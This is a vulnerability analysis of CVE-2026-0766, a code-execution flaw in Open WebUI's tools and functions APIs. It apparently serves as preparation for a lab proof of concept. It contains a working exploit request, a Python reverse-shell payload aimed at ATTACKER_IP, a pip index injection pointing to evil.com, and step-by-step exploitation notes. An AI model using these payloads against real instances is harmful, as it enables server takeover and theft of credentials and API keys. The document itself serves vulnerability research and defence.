# Vulnerability Analysis: CVE-2026-0766

## CVE ID
CVE-2026-0766

## CVSS
8.8 (HIGH) — CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## CWE
CWE-94: Improper Control of Generation of Code (Code Injection)

---

## Root Cause

The vulnerability is a direct **arbitrary Python code execution** via Python's `exec()` builtin. The function `load_tool_module_by_id()` in `backend/open_webui/utils/plugin.py` (line 101) takes user-supplied Python source code from the `content` field of a tool creation/update request and executes it directly with `exec(content, module.__dict__)`. There is **zero validation, sanitization, sandboxing, or AST inspection** of the content before execution.

The `exec()` call processes the entire `content` string as arbitrary Python code. While the application expects content to define a `Tools` class, any Python code placed before (or instead of) the class definition will execute immediately during the `exec()` call.

This is not a complex injection — the application is architecturally designed to execute user-provided Python code. The vulnerability is that this capability is exposed to authenticated users without any code safety controls.

### Identical Parallel Vulnerability
An identical `exec(content, module.__dict__)` call exists at line 145 for the `load_function_module_by_id()` function, affecting the functions API endpoints.

---

## Vulnerable File(s) and Function(s)

### Primary — Tools Path
- **File**: `backend/open_webui/utils/plugin.py`
- **Function**: `load_tool_module_by_id()` (lines 71–115)
- **Vulnerable line**: Line 101: `exec(content, module.__dict__)`

### Secondary — Functions Path (same file)
- **File**: `backend/open_webui/utils/plugin.py`
- **Function**: `load_function_module_by_id()` (lines 118–166)
- **Vulnerable line**: Line 145: `exec(content, module.__dict__)`

### Tertiary — Frontmatter Requirements Injection
- **File**: `backend/open_webui/utils/plugin.py`
- **Function**: `install_frontmatter_requirements()` (lines 267–283)
- **Vulnerable line**: Lines 272–277: `subprocess.check_call([sys.executable, "-m", "pip", "install"] + PIP_OPTIONS + req_list + PIP_PACKAGE_INDEX_OPTIONS)`
- **Note**: The requirements field from the frontmatter is split by comma and passed directly to pip. This allows pip argument injection (e.g., `--index-url=http://evil.com/simple malicious-package`).

---

## Triggering Input

### Minimum Payload (Tools API — Primary Vector)

**HTTP Request:**
```
POST /api/v1/tools/create HTTP/1.1
Host: <target>:8080
Authorization: Bearer <jwt_token>
Content-Type: application/json

{
  "id": "exploit_tool",
  "name": "Exploit",
  "content": "import os\nos.system('id > /tmp/pwned')\n\nclass Tools:\n    pass\n",
  "meta": {
    "description": "test",
    "manifest": {}
  }
}
```

The `content` field contains arbitrary Python code. The only constraint is that a `Tools` class must be defined somewhere in the content (otherwise the function raises an exception after exec — but the arbitrary code has **already executed** by that point). Even if no `Tools` class is present, the injected code runs before the check at line 106.

### Reverse Shell Payload Example
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])

class Tools:
    pass
```

---

## Vulnerable Code Paths (All Entry Points)

### 1. Tool Creation (Primary — Lowest Privilege)
```
POST /api/v1/tools/create
  → routers/tools.py:261 create_new_tools()     [requires: admin OR workspace.tools permission]
    → plugin.py:286 load_tool_module_by_id(form_data.id, content=form_data.content)
      → plugin.py:101 exec(content, module.__dict__)  ← RCE
```

### 2. Tool Update
```
POST /api/v1/tools/id/{id}/update
  → routers/tools.py:348 update_tools_by_id()    [requires: tool owner, write access, or admin]
    → plugin.py:375 load_tool_module_by_id(id, content=form_data.content)
      → plugin.py:101 exec(content, module.__dict__)  ← RCE
```

### 3. Function Creation (Admin Only)
```
POST /api/v1/functions/create
  → routers/functions.py:177 create_new_function()  [requires: admin]
    → plugin.py:193 load_function_module_by_id(form_data.id, content=form_data.content)
      → plugin.py:145 exec(content, module.__dict__)  ← RCE
```

### 4. Function Update (Admin Only)
```
POST /api/v1/functions/id/{id}/update
  → routers/functions.py:307 update_function_by_id()  [requires: admin]
    → plugin.py:313 load_function_module_by_id(id, content=form_data.content)
      → plugin.py:145 exec(content, module.__dict__)  ← RCE
```

### 5. Function Sync (Admin Only)
```
POST /api/v1/functions/sync
  → routers/functions.py:139 sync_functions()  [requires: admin]
    → plugin.py:146 load_function_module_by_id(function.id, content=function.content)
      → plugin.py:145 exec(content, module.__dict__)  ← RCE
```

### 6. Tool/Function Valves Spec + Load from DB (Indirect)
```
GET /api/v1/tools/id/{id}/valves/spec   [requires: verified user]
  → routers/tools.py:479 load_tool_module_by_id(id)   [loads content FROM DATABASE]
    → plugin.py:101 exec(content, module.__dict__)  ← Re-execution of stored payload
```
Note: If a malicious tool is already stored in the DB, viewing its valves re-executes the payload.

---

## Attack Scenario

### Scenario A: Fresh Instance (Most Likely)

1. **Attacker discovers** a fresh Open WebUI instance (port 8080, signup enabled by default: `ENABLE_SIGNUP=True`)
2. **Attacker signs up** as the first user via `POST /api/v1/auths/signup` — automatically becomes **admin**
3. **Attacker creates a malicious tool** via `POST /api/v1/tools/create` with a payload that executes arbitrary OS commands
4. **Server-side code execution occurs immediately** during the `exec()` call — before the tool is even saved to the database
5. **Attacker achieves RCE** as the application process (typically UID 0/root in the default Docker container)

### Scenario B: Existing Instance with workspace.tools Permission

1. Attacker registers as a normal user on an instance where admin has enabled `workspace.tools` permission
2. Attacker creates a malicious tool via the same API endpoint
3. RCE is achieved

### Scenario C: Admin Account Compromise

1. Attacker compromises admin credentials (phishing, credential stuffing, default passwords)
2. Uses either the tools or functions API to achieve RCE

---

## Impact

- **Remote Code Execution (RCE)** as the application process
- In default Docker deployment: runs as **root** (UID 0)
- Full read/write access to the container filesystem including:
  - SQLite database at `/app/backend/data/webui.db` (all user credentials, chat histories, API keys)
  - Environment variables (secrets, API keys for connected LLM services)
- Potential lateral movement to Docker host if Docker socket is mounted or container escapes are possible
- Full compromise of all data stored in the application

---

## Authentication Requirements

### Auth Flow for PoC
1. **Signup** (first user = admin): `POST /api/v1/auths/signup`
   ```json
   {
     "email": "admin@example.com",
     "password": "password123",
     "name": "Admin"
   }
   ```
   Response includes `token` field (JWT).

2. **Signin** (subsequent): `POST /api/v1/auths/signin`
   ```json
   {
     "email": "admin@example.com",
     "password": "password123"
   }
   ```
   Response includes `token` field (JWT).

3. **Use token**: All subsequent requests use `Authorization: Bearer <token>` header.

### JWT Details
- Algorithm: HS256
- Secret: `WEBUI_SECRET_KEY` environment variable (auto-generated from `/dev/random` if not set)
- Payload: `{"id": "<user_uuid>"}` with optional `exp` claim
- Token creation: `backend/open_webui/utils/auth.py:171` `create_token()`

### Permission Levels
- **Admin**: Can use both tools AND functions APIs — automatic for first signup
- **User with workspace.tools**: Can use tools API only — requires admin to enable `USER_PERMISSIONS_WORKSPACE_TOOLS_ACCESS=true` env var or through admin UI
- **Regular user**: Cannot exploit (no access to create/update tools or functions)

---

## Fix Assessment

**There is NO FIX.** The `exec()` call on user-supplied content persists through all released versions up to v0.8.5 (latest as of analysis). The ZDI advisory (ZDI-26-032) recommends restricting network access as the only mitigation.

The vulnerability is architectural — Open WebUI is intentionally designed to execute user-provided Python code as "tools" and "functions." A proper fix would require one or more of:
- Sandboxed Python execution (e.g., RestrictedPython, PyPy sandbox, containerized execution)
- AST-based validation restricting allowed imports and operations
- A fundamentally different plugin architecture (e.g., WASM-based plugins, JSON-defined tools)

Since no fix exists, the fix assessment is not applicable. The vulnerability is fully exploitable in all released versions.

---

## Potential Bypass Vectors

N/A — no fix exists to bypass. All code paths to `exec()` are open.

---

## Escalation Path

The vulnerability directly provides **arbitrary Python code execution** on the server, which is already the maximum severity primitive. No escalation chain is needed — the attacker can:

1. Execute any OS command via `os.system()`, `subprocess.run()`, etc.
2. Read/write any file the process has access to (root in Docker)
3. Open network connections (reverse shell, data exfiltration)
4. Access the SQLite database directly to dump all user credentials and chat data
5. Read environment variables for connected service API keys (OpenAI, Ollama, etc.)
6. Install additional tools/malware
7. If Docker socket is mounted: escape to the host

---

## Related Attack Surface

### 1. `load_function_module_by_id()` — Identical exec() vulnerability
- **File**: `backend/open_webui/utils/plugin.py`, line 145
- **Code**: `exec(content, module.__dict__)`
- **Entry points**: POST `/api/v1/functions/create`, POST `/api/v1/functions/id/{id}/update`, POST `/api/v1/functions/sync`
- **Auth**: Admin only (all function endpoints use `get_admin_user` dependency)

### 2. `install_frontmatter_requirements()` — Command injection via pip
- **File**: `backend/open_webui/utils/plugin.py`, lines 267–277
- **Code**: `subprocess.check_call([sys.executable, "-m", "pip", "install"] + PIP_OPTIONS + req_list + PIP_PACKAGE_INDEX_OPTIONS)`
- **Vector**: Frontmatter `requirements` field is split by comma and passed directly to pip subprocess. Attacker can inject pip arguments like `--index-url=http://evil.com/simple` to install a malicious package, or use dependency confusion.
- **Triggered by**: Both tool and function creation/update when content has frontmatter

### 3. Tool valves spec endpoints — Re-execution of stored payloads
- **File**: `backend/open_webui/routers/tools.py`, lines 479, 522, 579, 603
- **Code**: `tools_module, _ = load_tool_module_by_id(id)` (loads from DB, re-execs)
- **Auth**: `get_verified_user` — any verified user can trigger re-execution of a stored malicious tool
- **Impact**: Once a malicious tool is stored in the database, any user viewing its valves/spec re-triggers the payload

### 4. `get_tool_module_from_cache()` / `get_function_module_from_cache()` — Cache-miss re-execution
- **File**: `backend/open_webui/utils/plugin.py`, lines 169–208, 211–264
- **Vector**: When cache is cold or content has changed, these functions call `load_tool_module_by_id()` / `load_function_module_by_id()` which re-exec stored content from DB

### 5. Tool loading during GET /api/v1/tools/ (listing)
- **File**: `backend/open_webui/routers/tools.py`, line 61
- **Code**: `tool_module = get_tool_module(request, tool.id)` — loads ALL tools for listing
- **Impact**: Simply listing tools triggers exec() for every stored tool, re-executing any malicious payloads

---

## Build System

- **Name**: pip (Python) + npm (Node.js frontend)
- **Backend build**: `pip install -r requirements.txt` (152 dependencies)
- **Frontend build**: `npm ci && npm run build` (SvelteKit)
- **Runtime**: `uvicorn open_webui.main:app --host 0.0.0.0 --port 8080`
- **Database**: SQLite (default, stored at `/app/backend/data/webui.db`)

## Build Commands

### Using Pre-built Docker Image (Recommended)
```bash
docker pull ghcr.io/open-webui/open-webui:v0.6.32
docker run -d -p 3000:8080 \
  -v open-webui-data:/app/backend/data \
  -e WEBUI_SECRET_KEY=test-secret-key \
  --name open-webui \
  ghcr.io/open-webui/open-webui:v0.6.32
```

### Using Docker Compose
```yaml
services:
  open-webui:
    image: ghcr.io/open-webui/open-webui:v0.6.32
    container_name: open-webui
    ports:
      - "3000:8080"
    volumes:
      - open-webui-data:/app/backend/data
    environment:
      - WEBUI_SECRET_KEY=test-secret-key
      - ENABLE_SIGNUP=True
    restart: unless-stopped

volumes:
  open-webui-data: {}
```

### From Source (if needed)
```bash
cd backend
pip install -r requirements.txt
WEBUI_SECRET_KEY=test-secret-key python -m uvicorn open_webui.main:app --host 0.0.0.0 --port 8080
```

## Dependencies

### Runtime (Docker image includes all)
- Python 3.11
- FastAPI 0.115.7
- Uvicorn 0.35.0
- SQLAlchemy 2.0.38
- Pydantic 2.11.7
- python-jose 3.4.0 (JWT)
- passlib[bcrypt] 1.7.4
- 152 total pip packages (see `backend/requirements.txt`)

### For Lab Build
- Docker with compose plugin
- No LLM backend required (Ollama/OpenAI not needed — vulnerability is in the tools API)

## Runtime Requirements

- **Port**: 8080 (internal), mapped to 3000 externally
- **Data volume**: `/app/backend/data` (SQLite database, uploads, cache)
- **Environment variables**:
  - `WEBUI_SECRET_KEY` — JWT signing secret (auto-generated if empty)
  - `ENABLE_SIGNUP=True` — enabled by default, required for first-user admin creation
- **No external services required**: SQLite is the default database, no Ollama/OpenAI needed
- **Network**: HTTP on port 8080, no TLS by default
- **Health check**: `GET /health` returns 200 when ready

## PoC Agent Notes

### Simplest Exploitation Path
1. Start container: `docker run -d -p 3000:8080 ghcr.io/open-webui/open-webui:v0.6.32`
2. Wait for health: `curl http://localhost:3000/health`
3. Sign up as first user (becomes admin): `POST /api/v1/auths/signup`
4. Create malicious tool: `POST /api/v1/tools/create` with code injection in `content`
5. Verify execution: Check for side effect (file creation, reverse shell, etc.)

### Important Implementation Details
- The `id` field must pass `str.isidentifier()` check (alphanumeric + underscores, cannot start with digit)
- The `id` is lowercased before use
- The `content` SHOULD define a `Tools` class to avoid an exception, but code executes BEFORE the class check
- Even without a `Tools` class, the injected code runs — the exception is raised AFTER `exec()`
- The `meta` field requires `description` (Optional[str]) and `manifest` (Optional[dict], defaults to `{}`)
- Each tool `id` must be unique — use a unique ID per test to avoid "ID taken" errors
- For the update endpoint, the tool must already exist in the database
